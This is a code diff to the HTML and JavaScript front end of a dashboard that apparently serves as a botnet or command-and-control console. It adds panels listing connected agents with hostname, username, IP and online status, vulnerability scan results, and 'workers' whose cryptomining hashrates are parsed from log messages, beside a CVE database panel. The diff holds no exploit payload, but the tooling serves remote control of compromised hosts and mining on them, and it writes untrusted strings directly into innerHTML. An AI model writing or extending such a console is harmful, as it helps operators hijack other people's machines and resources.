@@ -334,6 +334,30 @@
       </button>
     </div>
     
+    <!-- CONNECTED AGENTS LIST -->
+    <div style="background:linear-gradient(135deg, #0a1a0a 0%, #102a10 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #00aa00;">
+      <div style="font-size:11px; color:#00aa00; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">🤖 CONNECTED AGENTS</div>
+      <div id="agents-list" style="max-height:300px; overflow-y:auto; font-size:11px;">
+        <div style="color:var(--text-muted);">Loading agents...</div>
+      </div>
+    </div>
+    
+    <!-- SCAN RESULTS -->
+    <div style="background:linear-gradient(135deg, #1a0a1a 0%, #2a102a 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #aa00aa;">
+      <div style="font-size:11px; color:#aa00aa; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">🔍 SCAN RESULTS</div>
+      <div id="scan-results" style="max-height:200px; overflow-y:auto; font-size:11px;">
+        <div style="color:var(--text-muted);">No scan results yet...</div>
+      </div>
+    </div>
+    
+    <!-- WORKERS / MACHINES -->
+    <div style="background:linear-gradient(135deg, #0a0a1a 0%, #10102a 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #0000aa;">
+      <div style="font-size:11px; color:#0066ff; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">⚙️ WORKERS & MACHINES</div>
+      <div id="workers-list" style="max-height:200px; overflow-y:auto; font-size:11px;">
+        <div style="color:var(--text-muted);">No workers connected...</div>
+      </div>
+    </div>
+    
     <!-- CVE DATABASE -->
     <div style="background:var(--bg-input); border-radius:10px; padding:15px;">
       <div style="font-size:11px; color:var(--text-muted); margin-bottom:10px; text-transform:uppercase;">CVE Database</div>
@@ -548,6 +572,28 @@ function initDomSocket() {
   
   socket.on('operation_log', (data) => {
     log(data.level || 'info', data.message, data.source || 'sys');
+    
+    // Update scan results panel
+    if (data.source === 'scan' && data.level === 'success') {
+      const scanList = document.getElementById('scan-results');
+      scanList.innerHTML += `<div style="padding:5px; border-bottom:1px solid #333;">${data.message}</div>`;
+    }
+    
+    // Update workers panel
+    if (data.source === 'mining' && data.level === 'success') {
+      const workersList = document.getElementById('workers-list');
+      const hostname = data.message.match(/⛏️ (\w+):/)?.[1] || 'unknown';
+      const hashrate = data.message.match(/(\d+) H\/s/)?.[1] || '0';
+      const existingWorker = workersList.querySelector(`[data-hostname="${hostname}"]`);
+      if (existingWorker) {
+        existingWorker.innerHTML = `<span style="color:#00ff00;">⛏️ ${hostname}</span> <span style="color:#0088ff;">${hashrate} H/s</span>`;
+      } else {
+        workersList.innerHTML += `<div data-hostname="${hostname}" style="padding:5px; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
+          <span style="color:#00ff00;">⛏️ ${hostname}</span>
+          <span style="color:#0088ff;">${hashrate} H/s</span>
+        </div>`;
+      }
+    }
   });
   
   socket.on('system_alert', (data) => {
@@ -656,22 +702,24 @@ function renderAgents() {
   }
   
   list.innerHTML = agents.slice(0, 30).map(a => {
-    const online = a.last_seen && (Date.now() - new Date(a.last_seen).getTime()) < 300000;
+    const online = a.is_alive === 1 || a.is_alive === true || (a.last_seen && (Date.now() - new Date(a.last_seen).getTime()) < 3600000);
     const platform = a.platform_type || a.os || 'unknown';
     const hostname = a.hostname || 'unknown';
     const ip = a.ip_internal || a.ip_external || '-';
     const username = a.username || '-';
     const agentId = a.id || a.agent_id || 'unknown';
+    const arch = a.arch || 'x64';
     
-    return `<div class="dom-agent-row" onclick="showAgent('${agentId}')">
-      <div class="dom-agent-main">
-        <div class="dom-agent-dot ${online ? 'online' : 'offline'}"></div>
-        <span class="dom-agent-id">${agentId.substring(0,12)}</span>
-        <span class="dom-agent-platform">${platform}</span>
+    return `<div class="dom-agent-row" onclick="showAgent('${agentId}')" style="padding:8px; border-bottom:1px solid #333;">
+      <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;">
+        <div class="dom-agent-dot ${online ? 'online' : 'offline'}" style="width:8px; height:8px; border-radius:50%; background:${online ? '#00ff00' : '#666'};"></div>
+        <span style="font-family:monospace; color:${online ? '#00ff00' : '#888'}; font-weight:bold;">${hostname}</span>
+        <span style="color:var(--text-muted); font-size:10px;">[${platform} ${arch}]</span>
       </div>
-      <div class="dom-agent-info">
-        <span>${hostname} (${username})</span>
-        <span>${ip}</span>
+      <div style="display:flex; gap:15px; color:var(--text-muted); font-size:10px; margin-left:16px;">
+        <span>👤 ${username}</span>
+        <span>🌐 ${ip}</span>
+        <span>🆔 ${agentId.substring(0,8)}...</span>
       </div>
     </div>`;
   }).join('');
